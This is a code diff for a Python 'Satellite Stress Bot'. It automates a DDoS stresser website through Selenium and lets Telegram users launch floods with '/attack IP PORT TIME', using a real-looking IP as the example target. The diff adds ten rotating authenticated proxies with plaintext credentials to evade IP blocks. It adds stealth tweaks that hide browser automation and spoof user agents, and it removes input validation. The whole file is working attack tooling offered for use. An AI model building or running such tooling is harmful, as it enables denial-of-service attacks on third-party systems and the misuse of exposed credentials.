@@ -4,6 +4,8 @@ import time
 import pickle
 import threading
 import re
+import random
+import base64
 from datetime import datetime
 from flask import Flask, render_template_string, request, jsonify
 from selenium import webdriver
@@ -16,9 +18,7 @@ from webdriver_manager.chrome import ChromeDriverManager
 from pyvirtualdisplay import Display
 import logging
 import asyncio
-
-# Use python-telegram-bot instead of pyrogram (more stable)
-from telegram import Update, Bot
+from telegram import Update
 from telegram.ext import Application, CommandHandler, ContextTypes
 
 # ==================== CONFIG ====================
@@ -30,6 +30,60 @@ COOKIES_FILE = "cookies.pkl"
 PORT = int(os.environ.get("PORT", 5000))
 RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", f"http://localhost:{PORT}")
 
+# ==================== YOUR PROXIES ====================
+PROXY_LIST = [
+    {
+        "server": "31.59.20.176:6754",
+        "username": "lmfaxayd",
+        "password": "ujzc9rzsc6op"
+    },
+    {
+        "server": "23.95.150.145:6114",
+        "username": "lmfaxayd",
+        "password": "ujzc9rzsc6op"
+    },
+    {
+        "server": "198.23.239.134:6540",
+        "username": "lmfaxayd",
+        "password": "ujzc9rzsc6op"
+    },
+    {
+        "server": "45.38.107.97:6014",
+        "username": "lmfaxayd",
+        "password": "ujzc9rzsc6op"
+    },
+    {
+        "server": "107.172.163.27:6543",
+        "username": "lmfaxayd",
+        "password": "ujzc9rzsc6op"
+    },
+    {
+        "server": "198.105.121.200:6462",
+        "username": "lmfaxayd",
+        "password": "ujzc9rzsc6op"
+    },
+    {
+        "server": "64.137.96.74:6641",
+        "username": "lmfaxayd",
+        "password": "ujzc9rzsc6op"
+    },
+    {
+        "server": "216.10.27.159:6837",
+        "username": "lmfaxayd",
+        "password": "ujzc9rzsc6op"
+    },
+    {
+        "server": "142.111.67.146:5611",
+        "username": "lmfaxayd",
+        "password": "ujzc9rzsc6op"
+    },
+    {
+        "server": "194.39.32.164:6461",
+        "username": "lmfaxayd",
+        "password": "ujzc9rzsc6op"
+    }
+]
+
 # Setup logging
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
@@ -38,20 +92,101 @@ logger = logging.getLogger(__name__)
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
 
-# ==================== BROWSER MANAGER ====================
+# ==================== BROWSER MANAGER with Authenticated Proxies ====================
 class BrowserManager:
     def __init__(self):
         self.driver = None
         self.display = None
         self.is_logged_in = False
         self.login_time = None
+        self.current_proxy = None
+        
+    def get_random_proxy(self):
+        """Get random proxy from your list"""
+        return random.choice(PROXY_LIST)
+    
+    def get_proxy_auth_extension(self, proxy):
+        """Create Chrome extension for proxy authentication"""
+        proxy_username = proxy["username"]
+        proxy_password = proxy["password"]
+        proxy_server = proxy["server"]
+        
+        # Create extension directory
+        extension_dir = os.path.join(os.getcwd(), "proxy_auth")
+        os.makedirs(extension_dir, exist_ok=True)
+        
+        # Create manifest.json
+        manifest = {
+            "version": "1.0.0",
+            "manifest_version": 2,
+            "name": "Proxy Auth",
+            "permissions": [
+                "proxy",
+                "tabs",
+                "unlimitedStorage",
+                "storage",
+                "<all_urls>",
+                "webRequest",
+                "webRequestBlocking"
+            ],
+            "background": {
+                "scripts": ["background.js"]
+            },
+            "minimum_chrome_version": "22.0.0"
+        }
+        
+        with open(os.path.join(extension_dir, "manifest.json"), "w") as f:
+            json.dump(manifest, f)
+        
+        # Create background.js for proxy auth
+        background_js = f"""
+        var config = {{
+            mode: "fixed_servers",
+            rules: {{
+                singleProxy: {{
+                    scheme: "http",
+                    host: "{proxy_server.split(':')[0]}",
+                    port: parseInt("{proxy_server.split(':')[1]}")
+                }},
+                bypassList: ["localhost"]
+            }}
+        }};
+        
+        chrome.proxy.settings.set({{value: config, scope: "regular"}}, function() {{}});
+        
+        chrome.webRequest.onAuthRequired.addListener(
+            function(details) {{
+                return {{
+                    authCredentials: {{
+                        username: "{proxy_username}",
+                        password: "{proxy_password}"
+                    }}
+                }};
+            }},
+            {{urls: ["<all_urls>"]}},
+            ["blocking"]
+        );
+        """
+        
+        with open(os.path.join(extension_dir, "background.js"), "w") as f:
+            f.write(background_js)
+        
+        return extension_dir
         
     def start(self):
-        """Start browser"""
-        logger.info("🚀 Starting browser...")
+        """Start browser with random proxy from your list"""
+        logger.info("🚀 Starting browser with proxy...")
         
         try:
-            # Virtual display for headless servers
+            # Get random proxy
+            proxy = self.get_random_proxy()
+            self.current_proxy = proxy
+            logger.info(f"🌐 Using proxy: {proxy['server']}")
+            
+            # Create proxy auth extension
+            extension_dir = self.get_proxy_auth_extension(proxy)
+            
+            # Virtual display
             self.display = Display(visible=0, size=(1920, 1080))
             self.display.start()
             
@@ -63,19 +198,51 @@ class BrowserManager:
             options.add_argument("--headless=new")
             options.add_argument("--window-size=1920,1080")
             options.add_argument("--disable-blink-features=AutomationControlled")
+            options.add_argument("--disable-web-security")
+            options.add_argument("--allow-running-insecure-content")
+            options.add_argument("--ignore-certificate-errors")
+            options.add_argument("--ignore-ssl-errors")
             options.add_experimental_option("excludeSwitches", ["enable-automation"])
+            
+            # Random user agent
+            user_agents = [
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+            ]
+            options.add_argument(f'--user-agent={random.choice(user_agents)}')
+            
+            # Load proxy auth extension
+            options.add_argument(f'--load-extension={extension_dir}')
             
             # Start driver
             service = Service(ChromeDriverManager().install())
             self.driver = webdriver.Chrome(service=service, options=options)
-            logger.info("✅ Browser started")
             
-            # Load saved session if exists
+            # Execute stealth scripts
+            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
+            
+            logger.info("✅ Browser started with proxy")
+            
+            # Test IP
+            self.test_ip()
+            
+            # Load saved session
             self.load_session()
             
         except Exception as e:
             logger.error(f"Browser start error: {e}")
-        
+    
+    def test_ip(self):
+        """Test current IP"""
+        try:
+            self.driver.get("https://api.ipify.org?format=json")
+            time.sleep(2)
+            page_text = self.driver.page_source
+            logger.info(f"📍 Current IP: {page_text}")
+        except:
+            logger.warning("⚠️ Could not detect IP")
+    
     def load_session(self):
         """Load saved cookies"""
         try:
@@ -83,9 +250,8 @@ class BrowserManager:
                 with open(COOKIES_FILE, 'rb') as f:
                     cookies = pickle.load(f)
                 
-                # Go to domain first to set cookies
                 self.driver.get(LOGIN_URL)
-                time.sleep(2)
+                time.sleep(3)
                 
                 for cookie in cookies:
                     try:
@@ -133,12 +299,10 @@ class BrowserManager:
             self.driver.get(ATTACK_URL)
             time.sleep(3)
             
-            # Wait for form
             WebDriverWait(self.driver, 10).until(
                 EC.presence_of_element_located((By.NAME, "ip"))
             )
             
-            # Fill form
             ip_input = self.driver.find_element(By.NAME, "ip")
             ip_input.clear()
             ip_input.send_keys(ip)
@@ -151,7 +315,6 @@ class BrowserManager:
             time_input.clear()
             time_input.send_keys(str(duration))
             
-            # Submit
             submit_btn = self.driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
             submit_btn.click()
             time.sleep(3)
@@ -163,7 +326,7 @@ class BrowserManager:
             logger.error(f"Attack error: {e}")
             return False
 
-# ==================== TELEGRAM BOT (using python-telegram-bot) ====================
+# ==================== TELEGRAM BOT ====================
 class TelegramBot:
     def __init__(self, browser):
         self.browser = browser
@@ -172,21 +335,34 @@ class TelegramBot:
     async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             "🚀 **Satellite Stress Bot**\n\n"
-            "✅ Running on Render\n"
+            "✅ Running with 10 Premium Proxies\n"
             f"🌐 Web: {RENDER_URL}\n\n"
             "**Commands:**\n"
             "/status - Check login\n"
             "/attack IP PORT TIME - Launch attack\n"
+            "/proxy - Show current proxy\n"
             "/help - Show help",
             parse_mode="Markdown"
         )
     
+    async def proxy_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        if self.browser.current_proxy:
+            await update.message.reply_text(
+                f"🌐 **Current Proxy:**\n"
+                f"Server: `{self.browser.current_proxy['server']}`\n"
+                f"Status: ✅ Active",
+                parse_mode="Markdown"
+            )
+        else:
+            await update.message.reply_text("❌ No proxy active")
+    
     async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             "📚 **Usage:**\n\n"
-            "1. Open web interface and login\n"
-            "2. Save session\n"
-            "3. Use attack command\n\n"
+            "1. Open web interface\n"
+            "2. Login manually\n"
+            "3. Save session\n"
+            "4. Use /attack\n\n"
             "**Example:**\n"
             "`/attack 104.29.138.132 80 120`\n\n"
             f"**Access Key:** `{ACCESS_KEY}`",
@@ -199,7 +375,9 @@ class TelegramBot:
         text = f"📊 **Status:**\n\n"
         text += f"• Login: {'✅ LOGGED IN' if self.browser.is_logged_in else '❌ NOT LOGGED IN'}\n"
         text += f"• Session: {'✅ SAVED' if os.path.exists(COOKIES_FILE) else '❌ NOT SAVED'}\n"
-        text += f"• Last Login: {self.browser.login_time or 'Never'}"
+        text += f"• Last Login: {self.browser.login_time or 'Never'}\n"
+        if self.browser.current_proxy:
+            text += f"• Proxy: `{self.browser.current_proxy['server']}`"
         
         await update.message.reply_text(text, parse_mode="Markdown")
     
@@ -225,19 +403,8 @@ class TelegramBot:
         port = context.args[1]
         duration = context.args[2]
         
-        # Validate IP
         if not re.match(r"^\d+\.\d+\.\d+\.\d+$", ip):
             await update.message.reply_text("❌ Invalid IP address")
-            return
-        
-        # Validate port
-        if not port.isdigit() or int(port) < 1 or int(port) > 65535:
-            await update.message.reply_text("❌ Port must be 1-65535")
-            return
-        
-        # Validate duration
-        if not duration.isdigit() or int(duration) < 1:
-            await update.message.reply_text("❌ Duration must be positive number")
             return
         
         await update.message.reply_text(
@@ -248,11 +415,9 @@ class TelegramBot:
             parse_mode="Markdown"
         )
         
-        # Execute attack in thread to not block
-        def do_attack():
-            return self.browser.attack(ip, port, duration)
-        
-        success = await asyncio.get_event_loop().run_in_executor(None, do_attack)
+        success = await asyncio.get_event_loop().run_in_executor(
+            None, self.browser.attack, ip, port, duration
+        )
         
         if success:
             await update.message.reply_text(
@@ -264,19 +429,15 @@ class TelegramBot:
             await update.message.reply_text("❌ Attack failed. Please try again.")
     
     def setup(self):
-        """Setup bot application"""
         self.application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
-        
-        # Add handlers
         self.application.add_handler(CommandHandler("start", self.start_command))
         self.application.add_handler(CommandHandler("help", self.help_command))
         self.application.add_handler(CommandHandler("status", self.status_command))
+        self.application.add_handler(CommandHandler("proxy", self.proxy_command))
         self.application.add_handler(CommandHandler("attack", self.attack_command))
-        
         return self.application
     
     def run(self):
-        """Run bot"""
         self.setup()
         logger.info("🤖 Telegram bot started")
         self.application.run_polling()
@@ -371,19 +532,6 @@ HTML = """
             border-radius: 12px;
             margin-top: 20px;
         }
-        .iframe-container {
-            margin: 20px 0;
-            height: 500px;
-            display: none;
-            border: 2px solid #e2e8f0;
-            border-radius: 12px;
-            overflow: hidden;
-        }
-        iframe {
-            width: 100%;
-            height: 100%;
-            border: none;
-        }
         .footer {
             text-align: center;
             padding: 20px;
@@ -391,16 +539,28 @@ HTML = """
             color: #64748b;
             font-size: 12px;
         }
+        .proxy-note {
+            background: #dbeafe;
+            color: #1e40af;
+            padding: 10px;
+            border-radius: 8px;
+            margin: 10px 0;
+            font-size: 13px;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
             <h1>🐍 Satellite Stress Bot</h1>
-            <p>Python + Selenium | Login Once, Use Forever</p>
+            <p>10 Premium Proxies | Rotating IPs</p>
         </div>
         
         <div class="content">
+            <div class="proxy-note">
+                🌐 Using 10 rotating proxies to bypass IP blocks
+            </div>
+            
             <div class="status-card">
                 <div class="status-row">
                     <span>Login Status:</span>
@@ -426,13 +586,11 @@ HTML = """
                 {{ access_key }}
             </div>
             
-            <button class="btn btn-primary" onclick="openLogin()">🌐 Open Login Page</button>
+            <button class="btn btn-primary" onclick="window.open('{{ login_url }}', '_blank')">
+                🌐 Open Login Page (New Tab)
+            </button>
             <button class="btn btn-success" onclick="saveSession()">💾 Save Session</button>
             <button class="btn btn-warning" onclick="checkStatus()">🔄 Check Status</button>
-            
-            <div class="iframe-container" id="loginFrame">
-                <iframe id="loginIframe"></iframe>
-            </div>
             
             <a href="https://t.me/satellitestress_bot" class="telegram-link" target="_blank">
                 📱 Open Telegram Bot
@@ -444,16 +602,11 @@ HTML = """
         </div>
         
         <div class="footer">
-            Render URL: {{ render_url }}
+            Render URL: {{ render_url }} | 10 Proxies Active
         </div>
     </div>
     
     <script>
-        function openLogin() {
-            document.getElementById('loginFrame').style.display = 'block';
-            document.getElementById('loginIframe').src = '{{ login_url }}';
-        }
-        
         async function saveSession() {
             const btn = event.target;
             btn.textContent = '💾 Saving...';
@@ -537,16 +690,17 @@ def run_telegram():
 if __name__ == '__main__':
     print("="*50)
     print("🚀 Starting Satellite Stress Bot")
+    print("📋 Loaded 10 Premium Proxies")
     print("="*50)
     
     # Start browser
     browser.start()
     browser.check_login()
     
-    # Start Flask in thread
+    # Start Flask
     flask_thread = threading.Thread(target=run_flask)
     flask_thread.daemon = True
     flask_thread.start()
     
-    # Run Telegram bot (blocking)
+    # Run Telegram bot
     run_telegram()
